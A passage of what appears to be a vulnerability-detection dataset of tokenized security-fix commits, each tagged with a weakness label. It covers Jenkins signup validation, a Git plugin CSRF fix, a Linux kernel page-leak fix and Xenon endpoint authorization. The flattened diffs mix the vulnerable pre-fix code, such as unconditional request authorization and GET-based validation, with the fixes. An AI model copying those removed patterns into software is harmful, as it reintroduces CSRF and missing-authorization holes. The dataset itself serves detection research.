"true", ",", "false", ",", "null", ")", ";", "j", ".", "jenkins", ".", "setSecurityRealm", "(", "securityRealm", ")", ";", "String", "currentRegex", "=", "\"", "^[", "A", "-", "Z", "]", "+[", "0", "-", "9", "]", "*$", "\";", "Field", "field", "=", "HudsonPrivateSecurityRealm", ".", "class", ".", "getDeclaredField", "(", "\"", "ID_REGEX", "\"", ");", "field", ".", "setAccessible", "(", "true", ")", ";", "field", ".", "set", "(", "null", ",", "currentRegex", ")", ";", "String", "password", "=", "\"", "testPwd", "\"", ";", "String", "email", "=", "\"", "test", "@", "test", ".", "com", "\"", ";", "int", "i", "=", "0", ";", "/", "/", "regular", "case", "=", "only", "accepting", "a", "-", "zA", "-", "Z0", "-", "9", "+", "\"", "-", "_", "\"", "checkUserCanBeCreatedWith", "(", "securityRealm", ",", "\"", "TEST", "\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ")", ";", "assertNotNull", "(", "User", ".", "getById", "(", "\"", "TEST", "\"", "+", "i", ",", "false", ")", ");", "i", "+", "+;", "checkUserCanBeCreatedWith", "(", "securityRealm", ",", "\"", "TEST123", "\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ")", ";", "assertNotNull", "(", "User", ".", "getById", "(", "\"", "TEST123", "\"", "+", "i", ",", "false", ")", ");", "i", "+", "+;", "{", "//", "user", "id", "that", "do", "not", "follow", "custom", "regex", "checkUserCannotBeCreatedWith_custom", "(", "securityRealm", ",", "\"", "test", "\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ",", "currentRegex", ")", ";", "i", "+", "+;", "checkUserCannotBeCreatedWith_custom", "(", "securityRealm", ",", "\"", "@\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ",", "currentRegex", ")", ";", "i", "+", "+;", "checkUserCannotBeCreatedWith_custom", "(", "securityRealm", ",", "\"", "T2A", "\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ",", "currentRegex", ")", ";", "i", "+", "+;", "}", "{", "/", "/", "we", "can", "even", "change", "regex", "on", "the", "fly", "currentRegex", "=", "\"", "^[", "0", "-", "9", "]", "*$", "\";", "field", ".", "set", "(", "null", ",", "currentRegex", ")", ";", "checkUserCanBeCreatedWith", "(", "securityRealm", ",", "\"", "125213", "\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ")", ";", "assertNotNull", "(", "User", ".", "getById", "(", "\"", "125213", "\"", "+", "i", ",", "false", ")", ");", "i", "+", "+;", "checkUserCannotBeCreatedWith_custom", "(", "securityRealm", ",", "\"", "TEST12", "\"", "+", "i", ",", "password", ",", "\"", "Test", "\"", "+", "i", ",", "email", ",", "currentRegex", ")", ";", "i", "+", "+;", "}", "}", "private", "void", "checkUserCanBeCreatedWith", "(", "HudsonPrivateSecurityRealm", "securityRealm", ",", "String", "id", ",", "String", "password", ",", "String", "fullName", ",", "String", "email", ")", "throws", "Exception", "{", "JenkinsRule", ".", "WebClient", "wc", "=", "j", ".", "createWebClient", "(", ");", "SignupPage", "signup", "=", "new", "SignupPage", "(", "wc", ".", "goTo", "(", "\"", "signup", "\"", "))", ";", "signup", ".", "enterUsername", "(", "id", ")", ";", "signup", ".", "enterPassword", "(", "password", ")", ";", "signup", ".", "enterFullName", "(", "fullName", ")", ";", "signup", ".", "enterEmail", "(", "email", ")", ";", "HtmlPage", "success", "=", "signup", ".", "submit", "(", "j", ")", ";", "assertThat", "(", "success", ".", "getElementById", "(", "\"", "main", "-", "panel", "\"", ").", "getTextContent", "(", "),", "containsString", "(", "\"", "Success", "\"", "))", ";", "}", "private", "void", "checkUserCannotBeCreatedWith", "(", "HudsonPrivateSecurityRealm", "securityRealm", ",", "String", "id", ",", "String", "password", ",", "String", "fullName", ",", "String", "email", ")", "throws", "Exception", "{", "JenkinsRule", ".", "WebClient", "wc", "=", "j", ".", "createWebClient", "(", ");", "SignupPage", "signup", "=", "new", "SignupPage", "(", "wc", ".", "goTo", "(", "\"", "signup", "\"", "))", ";", "signup", ".", "enterUsername", "(", "id", ")", ";", "signup", ".", "enterPassword", "(", "password", ")", ";", "signup", ".", "enterFullName", "(", "fullName", ")", ";", "signup", ".", "enterEmail", "(", "email", ")", ";", "HtmlPage", "success", "=", "signup", ".", "submit", "(", "j", ")", ";", "assertThat", "(", "success", ".", "getElementById", "(", "\"", "main", "-", "panel", "\"", ").", "getTextContent", "(", "),", "not", "(", "containsString", "(", "\"", "Success", "\"", "))", ");", "assertThat", "(", "success", ".", "getElementById", "(", "\"", "main", "-", "panel", "\"", ").", "getTextContent", "(", "),", "containsString", "(", "Messages", ".", "HudsonPrivateSecurityRealm_CreateAccount_UserNameInvalidCharacters", "(", "))", ");", "}", "private", "void", "checkUserCannotBeCreatedWith_custom", "(", "HudsonPrivateSecurityRealm", "securityRealm", ",", "String", "id", ",", "String", "password", ",", "String", "fullName", ",", "String", "email", ",", "String", "regex", ")", "throws", "Exception", "{", "JenkinsRule", ".", "WebClient", "wc", "=", "j", ".", "createWebClient", "(", ");", "SignupPage", "signup", "=", "new", "SignupPage", "(", "wc", ".", "goTo", "(", "\"", "signup", "\"", "))", ";", "signup", ".", "enterUsername", "(", "id", ")", ";", "signup", ".", "enterPassword", "(", "password", ")", ";", "signup", ".", "enterFullName", "(", "fullName", ")", ";", "signup", ".", "enterEmail", "(", "email", ")", ";", "HtmlPage", "success", "=", "signup", ".", "submit", "(", "j", ")", ";", "assertThat", "(", "success", ".", "getElementById", "(", "\"", "main", "-", "panel", "\"", ").", "getTextContent", "(", "),", "not", "(", "containsString", "(", "\"", "Success", "\"", "))", ");", "assertThat", "(", "success", ".", "getElementById", "(", "\"", "main", "-", "panel", "\"", ").", "getTextContent", "(", "),", "containsString", "(", "regex", ")", ");", "}", "}"], "docstring_tokens": ["cross-site", "request", "forgery"]}
{"contents": ["[SECURITY-528]", "doCheckUrl", "methods", "should", "be", "run", "using", "POST", "requests."], "code_tokens": ["@", "@", "-", "39", ",", "6", "+", "39", ",", "7", "@", "@", "import", "static", "hudson", ".", "Util", ".", "fixEmpty", ";", "import", "static", "hudson", ".", "Util", ".", "fixEmptyAndTrim", ";", "import", "hudson", ".", "model", ".", "FreeStyleProject", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "interceptor", ".", "RequirePOST", ";", "@", "ExportedBean", "public", "class", "UserRemoteConfig", "extends", "AbstractDescribableImpl", "<", "UserRemoteConfig", ">", "implements", "Serializable", "{", "@", "@", "-", "153", ",", "6", "+", "154", ",", "7", "@", "@", "public", "FormValidation", "doCheckCredentialsId", "(", "@", "AncestorInPath", "Item", "project", ",", "return", "FormValidation", ".", "warning", "(", "\"", "Cannot", "find", "any", "credentials", "with", "id", "\"", "+", "value", ")", ";", "}", "@", "RequirePOST", "@", "SuppressFBWarnings", "(", "value", "=", "\"", "NP_NULL_ON_SOME_PATH_FROM_RETURN_VALUE", "\"", ",", "justification", "=", "\"", "Jenkins", ".", "getInstance", "(", ")", "is", "not", "null", "\"", ")", "public", "FormValidation", "doCheckUrl", "(", "@", "AncestorInPath", "Item", "item", ",", "@", "QueryParameter", "String", "credentialsId", ",", "@", "@", "-", "44", ",", "6", "+", "44", ",", "7", "@", "@", "import", "org", ".", "kohsuke", ".", "stapler", ".", "DataBoundConstructor", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "DataBoundSetter", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "QueryParameter", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "interceptor", ".", "RequirePOST", ";", "/", "**", "*", "Runs", "Git", "using", "{", "@", "link", "GitSCM", "}", ".", "@", "@", "-", "98", ",", "6", "+", "99", ",", "7", "@", "@", "public", "ListBoxModel", "doFillCredentialsIdItems", "(", "@", "AncestorInPath", "Item", "project", ",", "return", "delegate", ".", "doFillCredentialsIdItems", "(", "project", ",", "url", ",", "credentialsId", ")", ";", "}", "@", "RequirePOST", "public", "FormValidation", "doCheckUrl", "(", "@", "AncestorInPath", "Item", "item", ",", "@", "QueryParameter", "String", "credentialsId", ",", "@", "QueryParameter", "String", "value", ")", "throws", "IOException", ",", "InterruptedException", "{", "@", "@", "-", "4", ",", "7", "+", "4", ",", "7", "@", "@", "f", "=", "namespace", "(", "lib", ".", "FormTagLib", ")", "c", "=", "namespace", "(", "lib", ".", "CredentialsTagLib", ")", "f", ".", "entry", "(", "title", ":", "_", "(", "\"", "Repository", "URL", "\"", "),", "field", ":", "\"", "url", "\"", ")", "{", "f", ".", "textbox", "(", ")", "f", ".", "textbox", "(", "checkMethod", ":", "\"", "post", "\"", ")", "}", "f", ".", "entry", "(", "title", ":", "_", "(", "\"", "Credentials", "\"", "),", "field", ":", "\"", "credentialsId", "\"", ")", "{", "@", "@", "-", "26", ",", "7", "+", "26", ",", "7", "@", "@", "THE", "SOFTWARE", ".", "<", "?", "jelly", "escape", "-", "by", "-", "default", "=", "'", "true", "'", "?>", "<", "j", ":", "jelly", "xmlns", ":", "j", "=", "\"", "jelly", ":", "core", "\"", "xmlns", ":", "st", "=", "\"", "jelly", ":", "stapler", "\"", "xmlns", ":", "f", "=", "\"/", "lib", "/", "form", "\"", "xmlns", ":", "c", "=", "\"/", "lib", "/", "credentials", "\"", ">", "<", "f", ":", "entry", "field", "=", "\"", "url", "\"", "title", "=", "\"$", "{%", "Repository", "URL", "}", "\">", "<", "f", ":", "textbox", "/", ">", "<", "f", ":", "textbox", "checkMethod", "=", "\"", "post", "\"", "/>", "<", "/", "f", ":", "entry", ">", "<", "f", ":", "entry", "field", "=", "\"", "branch", "\"", "title", "=", "\"$", "{%", "Branch", "}", "\">", "<", "f", ":", "textbox", "default", "=", "\"", "master", "\"", "/>"], "docstring_tokens": ["cross-site", "request", "forgery"]}
{"contents": ["more", "bio_map_user_iov()", "leak", "fixes", "we", "need", "to", "take", "care", "of", "failure", "exit", "as", "well", "-", "pages", "already", "in", "bio", "should", "be", "dropped", "by", "analogue", "of", "bio_unmap_pages(),", "since", "their", "refcounts", "had", "been", "bumped", "only", "once", "per", "reference", "in", "bio.", "Cc:", "stable@vger.kernel.org", "Signed-off-by:", "Al", "Viro", "<viro@zeniv.linux.org.uk>"], "code_tokens": ["@", "@", "-", "1331", ",", "6", "+", "1331", ",", "7", "@", "@", "struct", "bio", "*", "bio_map_user_iov", "(", "struct", "request_queue", "*", "q", ",", "int", "ret", ",", "offset", ";", "struct", "iov_iter", "i", ";", "struct", "iovec", "iov", ";", "struct", "bio_vec", "*", "bvec", ";", "iov_for_each", "(", "iov", ",", "i", ",", "*", "iter", ")", "{", "unsigned", "long", "uaddr", "=", "(", "unsigned", "long", ")", "iov", ".", "iov_base", ";", "@", "@", "-", "1375", ",", "7", "+", "1376", ",", "12", "@", "@", "struct", "bio", "*", "bio_map_user_iov", "(", "struct", "request_queue", "*", "q", ",", "ret", "=", "get_user_pages_fast", "(", "uaddr", ",", "local_nr_pages", ",", "(", "iter", "-", ">", "type", "&", "WRITE", ")", "!", "=", "WRITE", ",", "&", "pages", "[", "cur_page", "]", ");", "if", "(", "ret", "<", "local_nr_pages", ")", "{", "if", "(", "unlikely", "(", "ret", "<", "local_nr_pages", ")", ")", "{", "for", "(", "j", "=", "cur_page", ";", "j", "<", "page_limit", ";", "j", "+", "+)", "{", "if", "(", "!", "pages", "[", "j", "]", ")", "break", ";", "put_page", "(", "pages", "[", "j", "]", ");", "}", "ret", "=", "-", "EFAULT", ";", "goto", "out_unmap", ";", "}", "@", "@", "-", "1431", ",", "10", "+", "1437", ",", "8", "@", "@", "struct", "bio", "*", "bio_map_user_iov", "(", "struct", "request_queue", "*", "q", ",", "return", "bio", ";", "out_unmap", ":", "for", "(", "j", "=", "0", ";", "j", "<", "nr_pages", ";", "j", "+", "+)", "{", "if", "(", "!", "pages", "[", "j", "]", ")", "break", ";", "put_page", "(", "pages", "[", "j", "]", ");", "bio_for_each_segment_all", "(", "bvec", ",", "bio", ",", "j", ")", "{", "put_page", "(", "bvec", "-", ">", "bv_page", ")", ";", "}", "out", ":", "kfree", "(", "pages", ")", ";"], "docstring_tokens": ["out-of-memory", "condition"]}
{"contents": ["Add", "auth", "to", "UtilityService", "Extend", "auth", "check", "to", "UtiliyService", "endpoints:", "stats,", "config,", "subscription", "Issue:", "VRXEN-5", "Change-Id:", "I52a4b4a42731c244a97f97610dcaddb6837e67fb"], "code_tokens": ["@", "@", "-", "144", ",", "7", "+", "144", ",", "29", "@", "@", "public", "UtilityService", "setParent", "(", "Service", "parent", ")", "{", "@", "Override", "public", "void", "authorizeRequest", "(", "Operation", "op", ")", "{", "op", ".", "complete", "(", ");", "String", "suffix", "=", "UriUtils", ".", "buildUriPath", "(", "UriUtils", ".", "URI_PATH_CHAR", ",", "UriUtils", ".", "getLastPathSegment", "(", "op", ".", "getUri", "(", "))", ");", "/", "/", "allow", "access", "to", "ui", "endpoint", "if", "(", "ServiceHost", ".", "SERVICE_URI_SUFFIX_UI", ".", "equals", "(", "suffix", ")", ")", "{", "op", ".", "complete", "(", ");", "return", ";", "}", "ServiceDocument", "doc", "=", "new", "ServiceDocument", "(", ");", "if", "(", "this", ".", "parent", ".", "getOptions", "(", ").", "contains", "(", "ServiceOption", ".", "FACTORY_ITEM", ")", ")", "{", "doc", ".", "documentSelfLink", "=", "UriUtils", ".", "buildUriPath", "(", "UriUtils", ".", "getParentPath", "(", "this", ".", "parent", ".", "getSelfLink", "(", "))", ",", "suffix", ")", ";", "}", "else", "{", "doc", ".", "documentSelfLink", "=", "UriUtils", ".", "buildUriPath", "(", "this", ".", "parent", ".", "getSelfLink", "(", "),", "suffix", ")", ";", "}", "doc", ".", "documentKind", "=", "Utils", ".", "buildKind", "(", "this", ".", "parent", ".", "getStateType", "(", "))", ";", "if", "(", "getHost", "(", ").", "isAuthorized", "(", "this", ".", "parent", ",", "doc", ",", "op", ")", ")", "{", "op", ".", "complete", "(", ");", "return", ";", "}", "op", ".", "fail", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ")", ";", "}", "@", "Override", "@", "@", "-", "462", ",", "16", "+", "462", ",", "20", "@", "@", "public", "void", "guestAuthorization", "(", ")", "throws", "Throwable", "{", ".", "setBody", "(", "state", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_UNAUTHORIZED", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "OperationContext", ".", "setAuthorizationContext", "(", "this", ".", "host", ".", "getSystemAuthorizationContext", "(", "))", ";", "Map", "<", "String", ",", "ServiceStats", ".", "ServiceStat", ">", "stat", "=", "this", ".", "host", ".", "getServiceStats", "(", "UriUtils", ".", "buildUri", "(", "this", ".", "host", ",", "ServiceUriPaths", ".", "CORE_MANAGEMENT", ")", ");", "double", "currentInsertCount", "=", "stat", ".", "get", "(", "ServiceHostManagementService", ".", "STAT_NAME_AUTHORIZATION_CACHE_INSERT_COUNT", ")", ".", "latestValue", ";", "OperationContext", ".", "setAuthorizationContext", "(", "null", ")", ";", "/", "/", "Make", "a", "second", "request", "and", "verify", "that", "the", "cache", "did", "not", "get", "updated", ",", "instead", "Xenon", "re", "-", "used", "/", "/", "the", "cached", "Guest", "authorization", "context", ".", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "this", ".", "host", ",", "ExampleService", ".", "FACTORY_LINK", ")", ");", "OperationContext", ".", "setAuthorizationContext", "(", "this", ".", "host", ".", "getSystemAuthorizationContext", "(", "))", ";", "stat", "=", "this", ".", "host", ".", "getServiceStats", "(", "UriUtils", ".", "buildUri", "(", "this", ".", "host", ",", "ServiceUriPaths", ".", "CORE_MANAGEMENT", ")", ");", "OperationContext", ".", "setAuthorizationContext", "(", "null", ")", ";", "double", "newInsertCount", "=", "stat", ".", "get", "(", "ServiceHostManagementService", ".", "STAT_NAME_AUTHORIZATION_CACHE_INSERT_COUNT", ")", ".", "latestValue", ";", "assertTrue", "(", "currentInsertCount", "=", "=", "newInsertCount", ")", ";", "@", "@", "-", "709", ",", "6", "+", "713", ",", "16", "@", "@", "public", "void", "statefulServiceAuthorization", "(", ")", "throws", "Throwable", "{", "}", "))", ";", "this", ".", "host", ".", "testWait", "(", "ctx2", ")", ";", "/", "/", "do", "GET", "on", "factory", "/", "stats", ",", "we", "should", "get", "403", "Operation", "statsGet", "=", "Operation", ".", "createGet", "(", "this", ".", "host", ",", "ExampleService", ".", "FACTORY_LINK", "+", "ServiceHost", ".", "SERVICE_URI_SUFFIX_STATS", ")", ";", "this", ".", "host", ".", "sendAndWaitExpectFailure", "(", "statsGet", ",", "Operation", ".", "STATUS_CODE_FORBIDDEN", ")", ";", "/", "/", "do", "GET", "on", "factory", "/", "config", ",", "we", "should", "get", "403", "Operation", "configGet", "=", "Operation", ".", "createGet", "(", "this", ".", "host", ",", "ExampleService", ".", "FACTORY_LINK", "+", "ServiceHost", ".", "SERVICE_URI_SUFFIX_CONFIG", ")", ";", "this", ".", "host", ".", "sendAndWaitExpectFailure", "(", "configGet", ",", "Operation", ".", "STATUS_CODE_FORBIDDEN", ")", ";", "/", "/", "Assume", "Jane", "'", "s", "identity", "this", ".", "host", ".", "assumeIdentity", "(", "this", ".", "userServicePath", ")", ";", "/", "/", "add", "docs", "accessible", "by", "jane", "@", "@", "-", "750", ",", "9", "+", "764", ",", "27", "@", "@", "public", "void", "statefulServiceAuthorization", "(", ")", "throws", "Throwable", "{", "/", "/", "reset", "the", "auth", "context", "OperationContext", ".", "setAuthorizationContext", "(", "null", ")", ";", "/", "/", "do", "GET", "on", "utility", "suffixes", "in", "example", "child", "services", ",", "we", "should", "get", "403", "for", "(", "URI", "childUri", ":", "exampleServices", ".", "keySet", "(", "))", "{", "statsGet", "=", "Operation", ".", "createGet", "(", "this", ".", "host", ",", "childUri", ".", "getPath", "(", ")", "+", "ServiceHost", ".", "SERVICE_URI_SUFFIX_STATS", ")", ";", "this", ".", "host", ".", "sendAndWaitExpectFailure", "(", "statsGet", ",", "Operation", ".", "STATUS_CODE_FORBIDDEN", ")", ";", "configGet", "=", "Operation", ".", "createGet", "(", "this", ".", "host", ",", "childUri", ".", "getPath", "(", ")", "+", "ServiceHost", ".", "SERVICE_URI_SUFFIX_CONFIG", ")", ";", "this", ".", "host", ".", "sendAndWaitExpectFailure", "(", "configGet", ",", "Operation", ".", "STATUS_CODE_FORBIDDEN", ")", ";", "}", "/", "/", "Assume", "Jane", "'", "s", "identity", "through", "header", "auth", "token", "String", "authToken", "=", "generateAuthToken", "(", "this", ".", "userServicePath", ")", ";", "/", "/", "do", "GET", "on", "utility", "suffixes", "in", "example", "child", "services", ",", "we", "should", "get", "200", "for", "(", "URI", "childUri", ":", "exampleServices", ".", "keySet", "(", "))", "{", "statsGet", "=", "Operation", ".", "createGet", "(", "this", ".", "host", ",", "childUri", ".", "getPath", "(", ")", "+", "ServiceHost", ".", "SERVICE_URI_SUFFIX_STATS", ")", ";", "statsGet", ".", "addRequestHeader", "(", "Operation", ".", "REQUEST_AUTH_TOKEN_HEADER", ",", "authToken", ")", ";", "this", ".", "host", ".", "sendAndWaitExpectSuccess", "(", "statsGet", ")", ";", "}", "verifyJaneAccess", "(", "exampleServices", ",", "authToken", ")", ";", "/", "/", "test", "user", "impersonation", "@", "@", "-", "81", ",", "10", "+", "81", ",", "6", "@", "@", "public", "void", "createUsers", "(", ")", "throws", "Throwable", "{", "*", "isn", "'", "t", "created", "immediately", ",", "so", "this", "polls", ".", "*", "/", "private", "String", "loginUser", "(", "URI", "hostUri", ")", "throws", "Throwable", "{", "URI", "usersLink", "=", "UriUtils", ".", "buildUri", "(", "hostUri", ",", "UserService", ".", "FACTORY_LINK", ")", ";", "/", "/", "wait", "for", "factory", "availability", "this", ".", "host", ".", "waitForReplicatedFactoryServiceAvailable", "(", "usersLink", ")", ";", "String", "basicAuth", "=", "BasicAuthenticationUtils", ".", "constructBasicAuth", "(", "adminUser", ",", "adminUser", ")", ";", "URI", "loginUri", "=", "UriUtils", ".", "buildUri", "(", "hostUri", ",", "ServiceUriPaths", ".", "CORE_AUTHN_BASIC", ")", ";", "AuthenticationRequest", "login", "=", "new", "AuthenticationRequest", "(", ");", "@", "@", "-", "421", ",", "9", "+", "421", ",", "13", "@", "@", "private", "void", "doRequestRateLimits", "(", ")", "throws", "Throwable", "{", "ri", ".", "limit", "=", "limit", ";", "ri", ".", "options", "=", "EnumSet", ".", "of", "(", "RequestRateInfo", ".", "Option", ".", "PAUSE_PROCESSING", ")", ";", "this", ".", "host", ".", "setRequestRateLimit", "(", "userPath", ",", "ri", ")", ";", "this", ".", "host", ".", "assumeIdentity", "(", "userPath", ")", ";", "this", ".", "host", ".", "setSystemAuthorizationContext", "(", ");", "ServiceStat", "rateLimitStatBefore", "=", "getRateLimitOpCountStat", "(", ");", "this", ".", "host", ".", "resetSystemAuthorizationContext", "(", ");", "this", ".", "host", ".", "assumeIdentity", "(", "userPath", ")", ";", "if", "(", "rateLimitStatBefore", "=", "=", "null", ")", "{", "rateLimitStatBefore", "=", "new", "ServiceStat", "(", ");", "rateLimitStatBefore", ".", "latestValue", "=", "0", ".", "0", ";", "@", "@", "-", "442", ",", "7", "+", "446", ",", "10", "@", "@", "private", "void", "doRequestRateLimits", "(", ")", "throws", "Throwable", "{", "}", "this", ".", "host", ".", "testWait", "(", "ctx2", ")", ";", "ctx2", ".", "logAfter", "(", ");", "this", ".", "host", ".", "setSystemAuthorizationContext", "(", ");", "ServiceStat", "rateLimitStatAfter", "=", "getRateLimitOpCountStat", "(", ");", "this", ".", "host", ".", "resetSystemAuthorizationContext", "(", ");", "assertTrue", "(", "rateLimitStatAfter", ".", "latestValue", ">", "rateLimitStatBefore", ".", "latestValue", ")", ";", "this", ".", "host", ".", "setMaintenanceIntervalMicros", "(", "@", "@", "-", "472", ",", "7", "+", "479", ",", "9", "@", "@", "private", "void", "doRequestRateLimits", "(", ")", "throws", "Throwable", "{", "ctx3", ".", "logAfter", "(", ");", "/", "/", "verify", "rate", "limiting", "did", "not", "happen", "this", ".", "host", ".", "setSystemAuthorizationContext", "(", ");", "ServiceStat", "rateLimitStatExpectSame", "=", "getRateLimitOpCountStat", "(", ");", "this", ".", "host", ".", "resetSystemAuthorizationContext", "(", ");", "assertTrue", "(", "rateLimitStatAfter", ".", "latestValue", "=", "=", "rateLimitStatExpectSame", ".", "latestValue", ")", ";", "}", "@", "@", "-", "2627", ",", "8", "+", "2636", ",", "9", "@", "@", "private", "ServiceStat", "getODLStopCountStat", "(", ")", "throws", "Throwable", "{", "private", "ServiceStat", "getRateLimitOpCountStat", "(", ")", "throws", "Throwable", "{", "URI", "managementServiceUri", "=", "this", ".", "host", ".", "getManagementServiceUri", "(", ");", "return", "this", ".", "host", ".", "getServiceStats", "(", "managementServiceUri", ")", "ServiceStat", "stats", "=", "this", ".", "host", ".", "getServiceStats", "(", "managementServiceUri", ")", ".", "get", "(", "ServiceHostManagementService", ".", "STAT_NAME_RATE_LIMITED_OP_COUNT", ")", ";", "return", "stats", ";", "}", "@", "Test", "@", "@", "-", "300", ",", "11", "+", "300", ",", "14", "@", "@", "public", "void", "subscriptionsWithAuth", "(", ")", "throws", "Throwable", "{", "}", "}", ";", "hostWithAuth", ".", "setSystemAuthorizationContext", "(", ");", "Operation", "subscribe", "=", "Operation", ".", "createPost", "(", "UriUtils", ".", "buildUri", "(", "hostWithAuth", ",", "minimalServiceUUID", ")", ");", "subscribe", ".", "setReferer", "(", "hostWithAuth", ".", "getReferer", "(", "))", ";", "ServiceSubscriber", "subscriber", "=", "new", "ServiceSubscriber", "(", ");", "subscriber", ".", "replayState", "=", "true", ";", "hostWithAuth", ".", "startSubscriptionService", "(", "subscribe", ",", "notifyC", ",", "subscriber", ")", ";", "hostWithAuth", ".", "resetAuthorizationContext", "(", ");", "hostWithAuth", ".", "testWait", "(", "notifyContext", ")", ";", "}", "finally", "{", "if", "(", "hostWithAuth", "!", "=", "null", ")", "{", "@", "@", "-", "387", ",", "6", "+", "387", ",", "7", "@", "@", "public", "ExampleServiceState", "synchAfterOwnerRestartDo", "(", "}", "@", "Test", "@", "Ignore", "public", "void", "synchAfterClusterRestart", "(", ")", "throws", "Throwable", "{", "setUpMultiNode", "(", ");", "String", "factoryLink", "=", "ExampleService", ".", "FACTORY_LINK", ";", "@", "@", "-", "14", ",", "8", "+", "14", ",", "12", "@", "@", "package", "com", ".", "vmware", ".", "xenon", ".", "common", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertNotEquals", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertTrue", ";", "import", "static", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "ServiceHost", ".", "SERVICE_URI_SUFFIX_TEMPLATE", ";", "import", "static", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "ServiceHost", ".", "SERVICE_URI_SUFFIX_UI", ";", "import", "java", ".", "net", ".", "URI", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "EnumSet", ";", "@", "@", "-", "34", ",", "10", "+", "38", ",", "16", "@", "@", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "ServiceStats", ".", "TimeSeriesStats", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "ServiceStats", ".", "TimeSeriesStats", ".", "AggregationType", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "ServiceStats", ".", "TimeSeriesStats", ".", "TimeBin", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "test", ".", "AuthTestUtils", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "test", ".", "TestContext", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "test", ".", "TestRequestSender", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "test", ".", "TestRequestSender", ".", "FailureResponse", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "test", ".", "VerificationHost", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "AuthorizationContextService", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "ExampleService", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "ExampleService", ".", "ExampleServiceState", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "MinimalTestService", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "QueryTask", ".", "Query", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "ServiceUriPaths", ";", "public", "class", "TestUtilityService", "extends", "BasicReusableHostTestCase", "{", "@", "@", "-", "823", ",", "4", "+", "833", ",", "144", "@", "@", "public", "void", "statsKeyOrder", "(", ")", "{", "assertEquals", "(", "\"", "stat", "index", "2", "\"", ",", "\"", "keyCCC", "\"", ",", "statList", ".", "get", "(", "2", ")", ");", "}", "@", "Test", "public", "void", "endpointAuthorization", "(", ")", "throws", "Throwable", "{", "VerificationHost", "host", "=", "VerificationHost", ".", "create", "(", "0", ")", ";", "host", ".", "setAuthorizationService", "(", "new", "AuthorizationContextService", "(", "))", ";", "host", ".", "setAuthorizationEnabled", "(", "true", ")", ";", "host", ".", "setMaintenanceIntervalMicros", "(", "TimeUnit", ".", "MILLISECONDS", ".", "toMicros", "(", "100", ")", ");", "host", ".", "start", "(", ");", "TestRequestSender", "sender", "=", "host", ".", "getTestRequestSender", "(", ");", "host", ".", "setSystemAuthorizationContext", "(", ");", "host", ".", "waitForReplicatedFactoryServiceAvailable", "(", "UriUtils", ".", "buildUri", "(", "host", ",", "ExampleService", ".", "FACTORY_LINK", ")", ");", "String", "exampleUser", "=", "\"", "example", "@", "vmware", ".", "com", "\"", ";", "String", "examplePass", "=", "\"", "password", "\"", ";", "TestContext", "authCtx", "=", "host", ".", "testCreate", "(", "1", ")", ";", "AuthorizationSetupHelper", ".", "create", "(", ")", ".", "setHost", "(", "host", ")", ".", "setUserEmail", "(", "exampleUser", ")", ".", "setUserPassword", "(", "examplePass", ")", ".", "setResourceQuery", "(", "Query", ".", "Builder", ".", "create", "(", ")", ".", "addFieldClause", "(", "ServiceDocument", ".", "FIELD_NAME_KIND", ",", "Utils", ".", "buildKind", "(", "ExampleServiceState", ".", "class", ")", ")", ".", "build", "(", "))", ".", "setCompletion", "(", "authCtx", ".", "getCompletion", "(", "))", ".", "start", "(", ");", "authCtx", ".", "await", "(", ");", "/", "/", "create", "a", "sample", "service", "ExampleServiceState", "doc", "=", "new", "ExampleServiceState", "(", ");", "doc", ".", "name", "=", "\"", "foo", "\"", ";", "doc", ".", "documentSelfLink", "=", "\"", "foo", "\"", ";", "Operation", "post", "=", "Operation", ".", "createPost", "(", "host", ",", "ExampleService", ".", "FACTORY_LINK", ")", ".", "setBody", "(", "doc", ")", ";", "ExampleServiceState", "postResult", "=", "sender", ".", "sendAndWait", "(", "post", ",", "ExampleServiceState", ".", "class", ")", ";", "host", ".", "resetAuthorizationContext", "(", ");", "URI", "factoryAvailableUri", "=", "UriUtils", ".", "buildAvailableUri", "(", "host", ",", "ExampleService", ".", "FACTORY_LINK", ")", ";", "URI", "factoryStatsUri", "=", "UriUtils", ".", "buildStatsUri", "(", "host", ",", "ExampleService", ".", "FACTORY_LINK", ")", ";", "URI", "factoryConfigUri", "=", "UriUtils", ".", "buildConfigUri", "(", "host", ",", "ExampleService", ".", "FACTORY_LINK", ")", ";", "URI", "factorySubscriptionUri", "=", "UriUtils", ".", "buildSubscriptionUri", "(", "host", ",", "ExampleService", ".", "FACTORY_LINK", ")", ";", "URI", 